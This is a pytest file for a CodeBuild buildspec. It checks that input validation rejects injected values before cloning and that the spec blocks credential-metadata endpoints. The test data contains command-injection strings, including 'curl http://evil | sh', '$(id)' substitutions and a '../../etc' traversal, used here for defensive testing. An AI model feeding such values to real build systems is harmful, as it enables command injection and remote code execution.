import os
import subprocess
import tempfile
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[2]
SPEC = ROOT / "buildspec" / "backend-container.yml"


def block():
    spec = yaml.safe_load(SPEC.read_text())
    cmds = spec["phases"]["build"]["commands"]
    assert len(cmds) == 1
    return cmds[0]


def test_yaml_parses_and_bash_syntax_is_valid():
    with tempfile.NamedTemporaryFile("w", suffix=".sh", delete=False) as f:
        f.write(block())
    try:
        assert subprocess.run(["bash", "-n", f.name]).returncode == 0
    finally:
        os.unlink(f.name)


BASE = dict(RES_ID="r-abc123", RUNTIME="python", APP_PORT="8000", ENTRY="uvicorn main:app --host 0.0.0.0 --port 8000",
            APP_DIR=".", REPO_URL="https://github.com/o/n")


def run_block(**over):
    env = {"PATH": os.environ["PATH"], **BASE, **over}
    with tempfile.TemporaryDirectory() as d:
        # a fake `git` proves nothing is cloned when validation fails
        bindir = Path(d, "bin"); bindir.mkdir()
        (bindir / "git").write_text("#!/bin/sh\necho CLONED >&2\nexit 9\n")
        (bindir / "git").chmod(0o755)
        env["PATH"] = str(bindir) + ":" + env["PATH"]
        return subprocess.run(["bash", "-c", block()], cwd=d, env=env, capture_output=True, text=True)


@pytest.mark.parametrize("over,msg", [
    ({"RES_ID": "r-abc123; curl evil"}, "bad RES_ID"),
    ({"RUNTIME": "ruby"}, "bad RUNTIME"),
    ({"APP_PORT": "80; id"}, "bad APP_PORT"),
    ({"ENTRY": "uvicorn main:app; curl http://evil | sh"}, "bad ENTRY"),
    ({"ENTRY": "node $(id)"}, "bad ENTRY"),
    ({"ENTRY": "node `id`"}, "bad ENTRY"),
    ({"DJANGO_PROJECT": "x;id"}, "bad DJANGO_PROJECT"),
    ({"APP_DIR": "../../etc"}, "bad APP_DIR"),
    ({"APP_DIR": "a b"}, "bad APP_DIR"),
])
def test_bad_inputs_are_rejected_before_cloning(over, msg):
    r = run_block(**over)
    assert r.returncode == 1 and msg in r.stderr and "CLONED" not in r.stderr


def test_good_inputs_get_as_far_as_cloning():
    r = run_block()
    assert "CLONED" in r.stderr  # the fake git ran, so validation passed


def test_guards_against_credential_leaks_and_lambda_incompatible_images():
    text = SPEC.read_text()
    assert "169.254.170.2" in text and "169.254.169.254" in text   # CodeBuild creds + metadata blocked
    assert "BUILDX_NO_DEFAULT_ATTESTATIONS=1" in text               # Lambda rejects image indexes
    assert "public.ecr.aws/docker/library/python:3.12-slim" in text
    assert "public.ecr.aws/docker/library/node:20-slim" in text
    assert "aws-lambda-adapter:0.8.4" in text
    for var in ("AWS_LWA_PORT", "AWS_LWA_READINESS_CHECK_PATH=/", "AWS_LWA_READINESS_CHECK_MIN_UNHEALTHY_STATUS=500"):
        assert var in text
    assert "phase=cloning" in text and "phase=uploading" in text and "phase=done" in text
    assert "docker.io" not in text and "AWS_ACCESS_KEY" not in text
